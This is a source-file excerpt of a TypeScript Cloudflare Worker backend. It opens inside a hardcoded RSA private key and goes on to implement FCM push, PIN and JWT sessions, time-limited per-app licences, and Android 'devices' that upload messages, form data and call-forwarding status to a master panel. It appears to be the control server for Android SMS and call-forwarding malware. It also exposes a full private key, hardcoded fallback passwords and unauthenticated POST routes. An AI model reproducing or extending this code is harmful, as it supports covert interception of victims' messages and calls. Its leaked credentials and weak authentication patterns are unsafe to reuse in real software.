KEY-----\nMIIEugIBADANBgkqhkiG9w0BAQEFAASCBKQwggSgAgEAAoIBAQDZMJpUVmIkZjuC\nhvHNzJg3Mu9OL/Dw2mXZif8EIn4vE9R1kwQyd68hqBHOwV9Dy0K8zwrIU09GfKND\nh5Aij5TrCobAFzJgiOMDdm8+4a8NXQcx7J/C2Itj5gStYQHxwqmT++ZzNzvmdZkf\nOrY5MhY2zajq+fgpERyHE8KCD0UirFYsWwEqn6lxv9oyGCBkbq9fKfnE5lQxwCDh\nMUDMTMFRIdYkGsbErqTLJfDJ0LS8gf3PCRh2jWsWDYWVsrBtQMOleqIAchciQZ4N\n1CbcYT/HaX+ZkmdcrFSxue0Cb6ihWed7PDlb0bRbqH3+WJ1Z8EHou+pnN6sSdY3u\nA3VRcd9pAgMBAAECgf8CLLZbo3GVsWNliFjTQ6j3+zS0vDeR1xKip/FL0GQYUiXZ\nyfTuKzenhLFrYizKubFUNeIk8fsiItyJWkhpz125sjjHlnChx5/vsdnPwoLvnbKw\nsbxso5RND2ncK6ywzZgL+FeyuPMpgNaRYS2fR9KGLpxtT7V1T1oyey8oAQ9XClRD\nPycROqBAkCrmhcaA5vj1K9kDO/RxAmurS6CtpE9qcUi0eNhBUvPYDRi1eWytvoiF\nCAcJlGoO6qOmi+x1qIGxxwzYwHYv2YHTTcUl2H2wXknpcQ16SzRtUi7ESnArGxkE\ntIO5untib+97Z0n/Rlzc/4tj39qtek2+uML+eRkCgYEA81oXRw3ymSvyISbifRdD\nJjO4f12SuUGmQ4NqEDThd2WZEhX4vqt/D91Bm3mzGha9y0dV991QUTvLHPxJvBlw\nd4mY3enbwtNjB6WKKMoJS32nL9vTsyUZt53ITnGvStJWjbVBfLMxMMdgHWRBZAkx\nhbKZPJoKzVifYtru6LnZgw0CgYEA5Hpp5VdGUp+iiNf7nir+hhdlTsB9aSjDJAZ3\nnWjo9cmD1ZAOhzZ5BbuW13hy4zqErVjKOzsXkrTKzz9sSQspARCRtckFH6S3nPIB\n4CM5qCP650YHxwUsUUwmgPBSJJL+Q+KEZ+6Kh3ewUege6hzZ//UCK/5b4+cQSeyD\nIRQQJs0CgYBuLKCTS85E6K+DsN4jsi91kT77cvrlosJKmKmhUr+tVbMajBYFBRHO\nteZpJI0gx6D/8nkKcglV7dNEeThMz9uqUwKBncogB6IzKRBG7UmOAwJ5WXYcCjT9\ne5LfaPrqzhXfrGtMsLgZlHqAdA5i4wKnvDdCR5+SXogyslotxU6j1QKBgC+h8bfV\ndRy+mSUMWjHEZuHPuNgtOzgUPnKhQoi3mXG8fFamvNClo591V2I+gz0qMwTssOSe\nUjDMrkd8wneL8xV8vdP3P7E0Ju96aLewwFF0htd2eyKbynx8cr6I26cyWf4PGGmO\niqTpaAH7cY5/S1eYXcaMNd4SiwvOWhwoUaG1AoGAGfpFDp5cp210vV360Pf86DFa\nqc5+y+TLRrwLkpE6DlVscDBVDt1NhzaJGgTeo5kniv1c2rdvq0UVR3GdjORQggSf\nptX03BRuoSKtuHZNxWQnqQpMorQmDZgSklJlLTIWv5aq/iyCv78u815rxtvDKNH9\n+hW5Y1czi5JdGikljiw=\n-----END PRIVATE KEY-----\n";
  const private_key = normalizePrivateKey(rawKey);
  return { project_id, client_email, private_key };
}

function b64urlFromBytes(bytes: ArrayBuffer | Uint8Array): string {
  const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  let s = "";
  for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function b64urlFromString(s: string): string {
  return b64urlFromBytes(new TextEncoder().encode(s));
}
function b64FromPem(pem: string): Uint8Array {
  const body = pem
    .replace(/-----BEGIN [^-]+-----/g, "")
    .replace(/-----END [^-]+-----/g, "")
    .replace(/\s+/g, "");
  const bin = atob(body);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

let cachedToken: { token: string; expiresAt: number } | null = null;

async function getFcmAccessToken(env: Env): Promise<string> {
  if (cachedToken && cachedToken.expiresAt > Date.now() + 60_000) {
    return cachedToken.token;
  }
  const creds = getFirebaseCredentials(env);
  const now = Math.floor(Date.now() / 1000);
  const header = { alg: "RS256", typ: "JWT" };
  const claim = {
    iss: creds.client_email,
    scope: "https://www.googleapis.com/auth/firebase.messaging",
    aud: "https://oauth2.googleapis.com/token",
    iat: now,
    exp: now + 3600,
  };
  const unsigned = `${b64urlFromString(JSON.stringify(header))}.${b64urlFromString(JSON.stringify(claim))}`;
  const keyData = b64FromPem(creds.private_key);
  const key = await crypto.subtle.importKey(
    "pkcs8",
    keyData,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", key, new TextEncoder().encode(unsigned));
  const jwt = `${unsigned}.${b64urlFromBytes(sig)}`;

  const res = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
      assertion: jwt,
    }),
  });
  if (!res.ok) {
    const body = await res.text();
    throw new Error(`Google OAuth token error ${res.status}: ${body}`);
  }
  const json = await res.json() as { access_token: string; expires_in: number };
  cachedToken = {
    token: json.access_token,
    expiresAt: Date.now() + (json.expires_in * 1000),
  };
  return cachedToken.token;
}

async function sendFcmToToken(env: Env, fcmToken: string, data: Record<string, string>): Promise<{ messageId: string }> {
  const accessToken = await getFcmAccessToken(env);
  const creds = getFirebaseCredentials(env);
  const fcmUrl = `https://fcm.googleapis.com/v1/projects/${creds.project_id}/messages:send`;
  const res = await fetch(fcmUrl, {
    method: "POST",
    headers: { Authorization: `Bearer ${accessToken}`, "content-type": "application/json" },
    body: JSON.stringify({
        message: {
          token: fcmToken,
          android: { priority: "high", ttl: "3600s" },
          data: Object.assign({}, data, {
            payload: JSON.stringify(Object.fromEntries(Object.entries(data).filter(([k]) => k !== "type")))
          }),
        }
      }),
  });
  const body = await res.json() as Record<string, unknown>;
  if (!res.ok) {
    throw Object.assign(new Error("FCM rejected"), { fcmStatus: res.status, fcmBody: body });
  }
  if (typeof body["name"] !== "string" || !body["name"]) {
    throw Object.assign(new Error("FCM returned no message ID"), { fcmStatus: 502 });
  }
  return { messageId: body["name"] };
}

// =================== ADMIN SESSIONS (Postgres-backed for cross-isolate consistency) ===================
type AdminSession = {
  id: string; loginTime: string; lastActive: string;
  userAgent: string; ip: string; device: string;
};
function parseDevice(ua: string): string {
  if (/iPhone/.test(ua)) return "iPhone";
  if (/iPad/.test(ua)) return "iPad";
  if (/Android/.test(ua)) return "Android";
  if (/Windows/.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS/.test(ua)) return "Mac";
  if (/Linux/.test(ua)) return "Linux";
  return "Unknown Device";
}

// =================== UTIL ===================
const VALIDITY_DAYS = 30;
function isExpired(createdAt: string | Date | null | undefined): boolean {
  if (!createdAt) return false;
  const created = new Date(createdAt as string | Date).getTime();
  if (isNaN(created)) return false;
  return Date.now() > created + VALIDITY_DAYS * 86_400_000;
}

// =================== APP ===================


const app = new Hono<{ Bindings: Env; Variables: { sessionAppId: string } }>();
app.onError((err, c) => {
  // Log full detail server-side only — never leak internals (queries, stack traces) to clients.
  console.error("Unhandled error:", err);
  return c.json({ error: "Internal server error" }, 500);
});

app.use("*", cors({
  origin: "*",
  allowMethods: ["GET", "POST", "PATCH", "PUT", "DELETE", "OPTIONS"],
  allowHeaders: ["Content-Type", "Authorization", "x-master-pin", "x-master-session", "x-api-key", "x-session-token"],
}));

app.use("*", async (c, next) => {
  const method = c.req.method;
  const path   = c.req.path;
  // Block known attacker IPs — checked before anything else
  const clientIp = c.req.header("cf-connecting-ip") ?? c.req.header("x-forwarded-for") ?? "";
  const BLOCKED_IPS = ["34.47.251.0", "34.47.251"];
  if (BLOCKED_IPS.some(b => clientIp.startsWith(b))) {
    return c.json({ error: "Forbidden" }, 403);
  }
  // POST open (Android device comms) | OPTIONS open (CORS preflight) | healthz + tokens public
  // PATCH open ONLY for device/session paths (Android heartbeat) — admin/app PATCH requires key
  if (method === "OPTIONS" || path === "/api/healthz" || path.startsWith("/api/tokens/") || path.startsWith("/api/vps/") || path.startsWith("/api/token-app") || path.startsWith("/api/auth/")) {
    return await next();
  }
  if (method === "POST") {
    return await next();
  }
  // Delete-protection read is safe without x-api-key (no sensitive data exposed)
  if (method === "GET" && path.includes("/delete-protection")) {
    return await next();
  }
  // Complaint replies are public — polled by dashboard complaint chat (no login needed)
  if (method === "GET" && path.endsWith("/complaint-replies")) {
    return await next();
  }
  // Public notice ticker — no auth needed (read-only, non-sensitive)
  if (method === "GET" && path === "/api/notice") {
    return await next();
  }
  // Submitting a complaint is public — no login needed (matches previous client-side behavior)
  if (method === "POST" && path.endsWith("/complaint")) {
    return await next();
  }
  // Master SSE — EventSource can't send headers, so use short-lived HMAC-signed ?token=
  // Token issued by POST /api/master/sse-token after verifying master PIN — PIN never in URL
  if ((method === "GET" || method === "HEAD") && path === "/api/master/events") {
    const secret = c.env.API_SECRET;
    const sseToken = c.req.query("token") ?? "";
    if (secret && sseToken) {
      if (await verifySseToken(secret, sseToken)) return await next();
      return c.json({ error: "SSE token invalid or expired" }, 401);
    }
    return c.json({ error: "Unauthorized" }, 401);
  }
  if (method === "PATCH") {
    // Android device comms — allow without key (sessions/ removed — was a security hole)
    if (path.startsWith("/api/devices/") || path === "/api/admin/master-pin") {
      return await next();
    }
    // Admin PATCH (/api/apps/*, etc.) — fall through to session/master/apikey check below
  }
  // Android-facing: GET /api/apps/:appId (app status check) must stay open
    if (method === "GET" && /^\/api\/apps\/[^\/]+$/.test(path)) {
      return await next();
    }
      // Per-app session token (WebDashboard users after PIN login)
  // Sub-admin JWT Bearer check (payload: role="sub-admin", appId)
    const _subAuthHdr = c.req.header("Authorization") ?? "";
    if (_subAuthHdr.startsWith("Bearer ")) {
      const _subJwtTok = _subAuthHdr.slice(7);
      const _subJwtSec = (c.env as Env).JWT_SECRET;
      if (_subJwtSec) {
        const _subPl = await verifyJwt(_subJwtTok, _subJwtSec);
        if (_subPl && _subPl.role === "sub-admin" && typeof _subPl.appId === "string") {
             // Replay fix: ALWAYS live DB check — no cache.
            // CF Workers run on many distributed instances; in-memory cache is per-instance.
            // Logout deletes the DB row — checking DB guarantees immediate invalidation on ALL instances.
            const _jwtSessId = typeof _subPl.sub === "string" ? _subPl.sub : "";
            if (_jwtSessId) {
              try {
                const _jwtSql = neon(c.env.NEON_DATABASE_URL);
                const _jwtRows = await _jwtSql(
                  `SELECT id FROM admin_sessions WHERE id = $1 LIMIT 1`,
                  [_jwtSessId]
                ) as Array<{ id: string }>;
                if (_jwtRows.length > 0) {
                  c.set('sessionAppId', _subPl.appId);
                  return await next();
                }
              } catch { /* deny on DB error */ }
            }
            return c.json({ error: "Session expired. Please log in again." }, 401);
        }
      }
    }
  // x-session-token (raw UUID) removed — JWT Bearer only for sub-admin auth.
  // Master session check:
  if (await isMasterSession(c)) return await next();
  // x-api-key removed — Android SDK uses POST (already bypassed above)
  // Any GET/DELETE/PATCH admin route requires session token or master PIN only
  return c.json({ error: "Unauthorized" }, 401);
});

// ------- SSE TOKEN: exchange master PIN for a short-lived HMAC-signed token (no storage) -------
async function signSseToken(secret: string, expMs: number): Promise<string> {
  const payload = expMs.toString();
  const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(payload));
  const raw = Array.from(new Uint8Array(sig as ArrayBuffer));
  const b64 = btoa(raw.map(b => String.fromCharCode(b)).join(""));
  // URL-safe: replace + with -, / with _, strip = padding
  const token64 = b64.split("+").join("-").split("/").join("_").split("=").join("");
  return `${payload}.${token64}`;
}
async function verifySseToken(secret: string, token: string): Promise<boolean> {
  try {
    const dotIdx = token.indexOf(".");
    if (dotIdx < 0) return false;
    const payloadStr = token.slice(0, dotIdx);
    const sigB64url = token.slice(dotIdx + 1);
    if (!payloadStr || !sigB64url) return false;
    const exp = Number(payloadStr);
    if (isNaN(exp) || Date.now() > exp) return false;
    // Restore standard base64 from URL-safe
    const restored = sigB64url.split("-").join("+").split("_").join("/");
    const sigB64 = restored.padEnd(
      restored.length + (4 - restored.length % 4) % 4, "="
    );
    const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["verify"]);
    const sig = Uint8Array.from(atob(sigB64), (ch) => ch.charCodeAt(0));
    return await crypto.subtle.verify("HMAC", key, sig, new TextEncoder().encode(payloadStr));
  } catch { return false; }
}
app.post("/api/master/sse-token", async (c) => {
  if (!(await isMasterSession(c))) {
    return c.json({ error: "Unauthorized" }, 401);
  }
  const secret = c.env.API_SECRET;
  if (!secret) return c.json({ error: "Server misconfigured: API_SECRET not set" }, 500);
  const token = await signSseToken(secret, Date.now() + 90_000); // 90s — enough for EventSource to open
  return c.json({ token });
});

// ------- GATE PASS VERIFY (server-side — no hardcoded secrets in frontend) -------
app.post("/api/master/check-pass", async (c) => {
  const isMaster = await isMasterSession(c);
  if (!isMaster) return c.json({ error: "Unauthorized" }, 401);
  const body = await c.req.json().catch(() => ({})) as { type?: string; value?: string };
  if (!body.type || !body.value) return c.json({ error: "type and value required" }, 400);
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const key = body.type === "nav" ? "nav_pass" : body.type === "gate" ? "gate_pass" : null;
  if (!key) return c.json({ error: "invalid type" }, 400);
  // Read from DB; fall back to env var if not set
  const rows = await sqlClient(`SELECT value FROM settings WHERE key=$1`, [key]) as Array<{value:string}>;
  const stored = rows[0]?.value ?? (c.env as Record<string,string>)[key.toUpperCase().replace("_","_")] ?? (body.type === "nav" ? "verma" : "dbneon");
  return c.json({ ok: body.value === stored });
});

// ------- HEALTH -------
// ─── COMBINED INIT ENDPOINT — one request loads everything ───────────────────
// Replaces 3 parallel calls (devices + messages + formData) with a single round-trip.
// Cuts dashboard cold-start by ~60%.
app.get("/api/init", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const limitParam = c.req.query("limit");
  const rawLimit = limitParam == null ? 2000 : Math.max(0, Math.min(5000, parseInt(limitParam, 10) || 2000));
  if (!appId) return c.json({ error: "appId is required" }, 400);
  const isMaster = await isMasterSession(c);
  // Require valid session or master PIN
  if (!isMaster) {
    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
  }
  const msgWhere = isMaster
    ? eq(messages.appId, appId)
    : and(eq(messages.appId, appId), eq(messages.masterOnly, false));
  const [devRows, msgRows, fRows, [totalRow]] = await Promise.all([
    db.select().from(devices).where(eq(devices.appId, appId)),
    db.select().from(messages).where(msgWhere)
      .orderBy(desc(messages.receivedAt)).limit(rawLimit),
    db.select().from(formData).where(eq(formData.appId, appId))
      .orderBy(desc(formData.submittedAt)),
    db.select({ count: sql`COUNT(*)` }).from(messages).where(msgWhere),
  ]);
  return c.json({
    devices: devRows.map(mapDevice),
    messages: msgRows.map(mapMessage),
    formData: fRows.map(mapFormData),
    totalMessages: Number(totalRow?.count ?? 0),
  });
});

app.get("/api/healthz", (c) => c.json({ status: "ok" }));

// ------- TOKEN VERIFY (public) -------
app.get("/api/tokens/:token", async (c) => {
  const token = c.req.param("token");
  if (!token) return c.json({ status: "inactive", error: "token required" }, 400);
  const key = btoa(token).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  try {
    const res = await fetch(`https://apkstore-ce547-default-rtdb.firebaseio.com/token_primary/${key}.json`);
    const data = await res.json() as { apkId?: number } | null;
    if (!data || typeof data !== "object" || !data.apkId) {
      return c.json({ status: "inactive", error: "Token not registered" }, 404);
    }
    return c.json({ status: "active", apkId: data.apkId });
  } catch {
    return c.json({ status: "inactive", error: "Verification failed" }, 500);
  }
});

// ------- APPS -------
app.get("/api/apps", async (c) => {
  const db = getDb(c.env);
  const isMaster = await isMasterSession(c);
  // Sub-admin session: return ONLY their own app (not all apps — prevents app ID enumeration)
  if (!isMaster) {
    const sqlC = neon(c.env.NEON_DATABASE_URL);
    const appId = c.get('sessionAppId');
    if (!appId) return c.json({ error: "Unauthorized" }, 401);
    const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    if (!row) return c.json([], 200);
    const [secret0] = await db.select({ dpEnabled: appSecrets.deleteProtectionEnabled }).from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
    // auto-disable expired
    if (row.appId !== DEFAULT_APP_ID && row.status === "active" && row.createdAt && isExpired(row.createdAt)) {
      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
      const [updated] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
      return c.json(updated ? [mapApp(updated, secret0?.dpEnabled ?? false)] : [mapApp(row, secret0?.dpEnabled ?? false)]);
    }
    return c.json([mapApp(row, secret0?.dpEnabled ?? false)]);
  }
  // Master: return all apps (existing behaviour)
  const rows = await db.select().from(apps).orderBy(desc(apps.createdAt));
  for (const r of rows) {
    if (r.appId === DEFAULT_APP_ID && r.status !== "active") {
      await db.update(apps).set({ status: "active" }).where(eq(apps.appId, r.appId));
    } else if (r.appId !== DEFAULT_APP_ID && r.status === "active" && r.createdAt && isExpired(r.createdAt)) {
      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, r.appId));
    }
  }
  const fresh = await db.select().from(apps).orderBy(desc(apps.createdAt));
  const dpRows = await db.select({ appId: appSecrets.appId, dpEnabled: appSecrets.deleteProtectionEnabled }).from(appSecrets);
  const dpMap = Object.fromEntries(dpRows.map(r => [r.appId, r.dpEnabled]));
  return c.json(fresh.map(r => mapApp(r, dpMap[r.appId] ?? false)));
});

app.get("/api/apps/:appId", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  const [secret0] = await db.select({ dpEnabled: appSecrets.deleteProtectionEnabled, loginLimit: appSecrets.loginLimit }).from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
    await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
    const [updated] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    return c.json(updated ? mapApp(updated, secret0?.dpEnabled ?? false, secret0?.loginLimit) : mapApp(row, secret0?.dpEnabled ?? false, secret0?.loginLimit));
  }
  return c.json(mapApp(row, secret0?.dpEnabled ?? false, secret0?.loginLimit));
});

app.post("/api/apps", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const db = getDb(c.env);
    const body = await c.req.json() as { appId?: string; name?: string; pin?: string; status?: string };
    if (!body.appId || !body.name) return c.json({ error: "appId and name are required" }, 400);
    const inserted = await db.insert(apps).values({
      appId: body.appId, name: body.name, status: body.status ?? "active",
    }).onConflictDoNothing({ target: apps.appId }).returning();
    if (inserted.length === 0) return c.json({ error: "App ID already exists" }, 409);
    await db.insert(appSecrets).values({
      appId: body.appId, pin: body.pin ?? "1234",
    }).onConflictDoNothing({ target: appSecrets.appId });
    await db.insert(appPanelTokens).values({
      appId: body.appId, panelToken: crypto.randomUUID(),
    }).onConflictDoNothing({ target: appPanelTokens.appId });
    return c.json(mapApp(inserted[0]), 201);
  });

app.patch("/api/apps/:appId", async (c) => {
    const appId = c.req.param("appId");
    const isMaster = await isMasterSession(c);
    // Master → full access. Sub-admin JWT → must belong to THIS appId.
    if (!isMaster) {
      if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
    }

    const db = getDb(c.env);
    const body = await c.req.json() as { name?: string; pin?: string; status?: string; currentPin?: string; loginLimit?: number };
    const patch: Partial<typeof apps.$inferInsert> = {};
    if (body.name !== undefined) patch.name = body.name;
    if (body.status !== undefined) patch.status = body.status;
    // loginLimit lives in app_secrets (split apart from apps) — updated separately below,
    // never merged into the `patch` object applied to the apps table.
    // Master OR the sub-admin session owning this appId (already verified above) can change it.
    let loginLimitChanged = false;
    if (body.loginLimit !== undefined) {
      const n = Number(body.loginLimit);
      if (!Number.isFinite(n) || n < 1 || n > 1000) return c.json({ error: "loginLimit must be a number between 1 and 1000" }, 400);
      await db.update(appSecrets).set({ loginLimit: Math.floor(n) }).where(eq(appSecrets.appId, appId));
      loginLimitChanged = true;
    }

    // Changing PIN — master can always; session owner needs currentPin as confirmation
    let pinChanged = false;
    if (body.pin !== undefined) {
      const [existingSecret] = await db.select().from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
      if (!existingSecret) return c.json({ error: "App not found" }, 404);
      if (!isMaster) {
        if (!body.currentPin) return c.json({ error: "currentPin required to change PIN" }, 400);
        const _pep = (c.env as Env).PIN_PEPPER ?? "";
        if (!(await _verifyPin(body.currentPin, existingSecret.pin, _pep))) return c.json({ error: "Wrong current PIN" }, 401);
      }
      await db.update(appSecrets).set({ pin: await _hashPin(body.pin, (c.env as Env).PIN_PEPPER ?? "") }).where(eq(appSecrets.appId, appId));
      pinChanged = true;
    }

    let row: typeof apps.$inferSelect | undefined;
    if (Object.keys(patch).length > 0) {
      [row] = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
      if (!row) return c.json({ error: "App not found" }, 404);
    } else if (pinChanged || loginLimitChanged) {
      [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
      if (!row) return c.json({ error: "App not found" }, 404);
    } else {
      return c.json({ error: "No fields to update" }, 400);
    }
    // PIN change — purani saari sessions delete karo taaki attacker ka access khatam ho
    if (pinChanged) {
      const sqlC = neon(c.env.NEON_DATABASE_URL);
      await sqlC(`DELETE FROM admin_sessions WHERE app_id = $1`, [appId]);
      for (const [k, v] of _sessionCache.entries()) { if (v.appId === appId) _sessionCache.delete(k); }
    }
    const [freshSecret] = await db.select({ dpEnabled: appSecrets.deleteProtectionEnabled, loginLimit: appSecrets.loginLimit }).from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
    return c.json(mapApp(row, freshSecret?.dpEnabled ?? false, freshSecret?.loginLimit));
  });

app.delete("/api/apps/:appId", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const db = getDb(c.env);
    const appId = c.req.param("appId");
    const [row] = await db.delete(apps).where(eq(apps.appId, appId)).returning();
    if (!row) return c.json({ error: "App not found" }, 404);
    await db.delete(appSecrets).where(eq(appSecrets.appId, appId));
    return c.json({ ok: true });
  });

app.post("/api/apps/:appId/verify-pin", async (c) => {
    const db = getDb(c.env);
    const appId = c.req.param("appId");
    const body = await c.req.json() as { pin?: string; panelToken?: string };
    if (!body.pin) return c.json({ error: "PIN required" }, 400);

    const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    if (!row) return c.json({ error: "App not found" }, 404);
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
      return c.json({ error: "Licence expired. Please contact admin." }, 403);
    }
    if (row.status !== "active") return c.json({ error: "App is disabled. Please contact admin." }, 403);
    // NOTE: the "pt" access-link token used to be a required second credential here
    // alongside the PIN. Removed per product decision — bare PIN is now sufficient to log
    // in; a "pt" param in the URL (from old shared links) is purely cosmetic/legacy now and
    // is no longer checked against app_panel_tokens.
    const [secret] = await db.select({ pin: appSecrets.pin }).from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
    const pepper1 = (c.env as Env).PIN_PEPPER ?? "";
    if (!secret || !(await _verifyPin(body.pin, secret.pin, pepper1))) return c.json({ error: "Wrong PIN." }, 401);
    // Auto-upgrade plaintext PIN → PBKDF2 hash on successful login
    if (!_isPinHashed(secret.pin)) {
      await db.update(appSecrets).set({ pin: await _hashPin(body.pin, pepper1) }).where(eq(appSecrets.appId, appId));
    }
    return c.json({ ok: true, appId: row.appId, name: row.name });
  });

// ------- DELETE PROTECTION -------
app.get("/api/apps/:appId/delete-protection", async (c) => {
    await ensureSchema(c.env);
    const db = getDb(c.env);
    const [row] = await db.select().from(appSecrets).where(eq(appSecrets.appId, c.req.param("appId"))).limit(1);
    if (!row) return c.json({ error: "App not found" }, 404);
    const resp = c.json({ enabled: row.deleteProtectionEnabled ?? false, hasPin: !!row.deleteProtectionPin });
    resp.headers.set("Cache-Control", "no-store, no-cache, must-revalidate");
    resp.headers.set("Pragma", "no-cache");
    return resp;
  });

app.post("/api/apps/:appId/delete-protection/set-pin", async (c) => {
    await ensureSchema(c.env);
    const db = getDb(c.env);
    const appId = c.req.param("appId");
    const isMasterSetPin = await isMasterSession(c);
    const body = await c.req.json() as { pin?: string; currentPin?: string };
    if (!body.pin || body.pin.length < 4) return c.json({ error: "pin required (min 4 chars)" }, 400);
    const [row] = await db.select().from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
    if (!row) return c.json({ error: "App not found" }, 404);
    if (row.deleteProtectionPin && !isMasterSetPin) {
      if (!body.currentPin) return c.json({ error: "currentPin required to change" }, 403);
      if (!(await _verifyPin(body.currentPin, row.deleteProtectionPin, (c.env as Env).PIN_PEPPER ?? ""))) return c.json({ error: "Wrong current pin" }, 401);
    }
    await db.update(appSecrets).set({ deleteProtectionPin: await _hashPin(body.pin, (c.env as Env).PIN_PEPPER ?? "") }).where(eq(appSecrets.appId, appId));
    return c.json({ ok: true });
  });

  app.post("/api/apps/:appId/delete-protection/toggle", async (c) => {
    await ensureSchema(c.env);
    const db = getDb(c.env);
    const appId = c.req.param("appId");
    const isMaster = await isMasterSession(c);
    const body = await c.req.json() as { pin?: string };
    const [row] = await db.select().from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
    if (!row) return c.json({ error: "App not found" }, 404);
    if (!isMaster) {
      if (!body.pin) return c.json({ error: "pin required" }, 400);
      if (!row.deleteProtectionPin) return c.json({ error: "Set a delete protection pin first" }, 403);
      if (!(await _verifyPin(body.pin, row.deleteProtectionPin, (c.env as Env).PIN_PEPPER ?? ""))) return c.json({ error: "Wrong pin" }, 401);
    }
    const newEnabled = !(row.deleteProtectionEnabled ?? false);
    await db.update(appSecrets).set({ deleteProtectionEnabled: newEnabled }).where(eq(appSecrets.appId, appId));
    return c.json({ ok: true, enabled: newEnabled });
  });

// ------- DEVICES -------
app.get("/api/devices", async (c) => {
  const db = getDb(c.env);
  const userId = c.req.query("userId");
  const appId = c.req.query("appId");
  const _im1=await isMasterSession(c);
  // SECURITY: appId is required for EVERYONE, including master PIN callers — this is a
  // per-app device view, not a global dump. Use /api/master/all-devices for an intentional
  // cross-app overview instead.
  if(!appId)return c.json({error:"appId required"},400);
  if(!_im1){
    if(c.get('sessionAppId') !== appId)return c.json({error:"Unauthorized"},401);
  }
  const where = eq(devices.appId, appId);
  const rows = await db.select().from(devices).where(where);
  return c.json(rows.map(mapDevice));
});

app.get("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const [row] = await db.select().from(devices).where(eq(devices.deviceId, c.req.param("deviceId"))).limit(1);
  if (!row) return c.json({ error: "Device not found" }, 404);
  return c.json(mapDevice(row));
});

app.patch("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  const patch: Partial<typeof devices.$inferInsert> = { updatedAt: new Date() };
  // Admin-only fields require session or master PIN.
  // forwardEnabled/forwardSlot excluded — Android CallForwardWorker must self-report
  // its own forwarding status without an admin session.
  const hasAdminFields = body.starred !== undefined;
  if (hasAdminFields) {
    const isMasterPatch = await isMasterSession(c);
    if (!isMasterPatch) {
      // PATCH /api/devices/ bypasses global middleware — verify JWT Bearer directly here
      const _authHdr = c.req.header("Authorization") ?? "";
      if (!_authHdr.startsWith("Bearer ")) return c.json({ error: "Unauthorized" }, 401);
      const _jwtSec = (c.env as Env).JWT_SECRET;
      if (!_jwtSec) return c.json({ error: "Unauthorized" }, 401);
      const _pl = await verifyJwt(_authHdr.slice(7), _jwtSec);
      if (!_pl || _pl.role !== "sub-admin") return c.json({ error: "Unauthorized" }, 401);
    }
  }
  if (body.status !== undefined) patch.status = String(body.status);
  if (body.lastOnline !== undefined) patch.lastOnline = body.lastOnline ? new Date(String(body.lastOnline)) : null;
  if (body.fcmToken !== undefined) patch.fcmToken = String(body.fcmToken);
  if (body.forwardEnabled !== undefined) patch.forwardEnabled = Boolean(body.forwardEnabled);
  if (body.forwardSlot !== undefined) patch.forwardSlot = body.forwardSlot === null ? null : Number(body.forwardSlot);
  if (body.starred !== undefined) patch.starred = Boolean(body.starred);
  const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, c.req.param("deviceId"))).returning();
  if (!row) return c.json({ error: "Device not found" }, 404);
  const mapped = mapDevice(row);
  await broadcast(c.env, "device_updated", mapped);
  return c.json(mapped);
});

// ------- MESSAGES -------
app.get("/api/messages/count", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  // Master may omit appId for a global cross-app count (MainAdminPanel feature).
  const _isMasterCaller = await isMasterSession(c);
  if (!_isMasterCaller) {
    if (!appId) return c.json({ error: "appId required" }, 400);
    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
  }
  const where = appId ? eq(messages.appId, appId) : undefined;
  const rows = where
    ? await db.select({ count: sql`COUNT(*)` }).from(messages).where(where)
    : await db.select({ count: sql`COUNT(*)` }).from(messages);
  return c.json({ count: Number(rows[0]?.count ?? 0) });
});

app.get("/api/messages", async (c) => {
  const db = getDb(c.env);
